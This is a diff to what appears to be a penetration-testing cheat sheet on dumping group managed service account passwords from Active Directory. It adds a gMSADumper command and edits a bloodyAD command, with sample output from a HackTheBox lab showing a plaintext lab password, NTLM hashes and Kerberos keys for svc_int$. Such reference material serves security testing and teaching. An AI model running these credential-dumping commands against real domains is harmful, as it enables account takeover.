@@ -25,17 +25,21 @@ svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd9284
 svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 ```
 
+```console
+python3 gMSADumper.py -k -l <DC> -d <DOMAIN>
+```
+
 <small>*Ref: [gMSADumper](https://github.com/micahvandeusen/gMSADumper)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
 ```console
-sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d intelligence.htb -u ted.graves -p 'Mr.Teddy' --host intelligence.htb get object 'svc_int$' --attr msDS-ManagedPassword 
+$ bloodyAD -d intelligence.htb -u ted.graves -p 'Mr.Teddy' --host intelligence.htb get object 'svc_int$' --attr msDS-ManagedPassword 
 
 distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:80d4ea8c2d5ccfd1ebac5bd732ece5e4
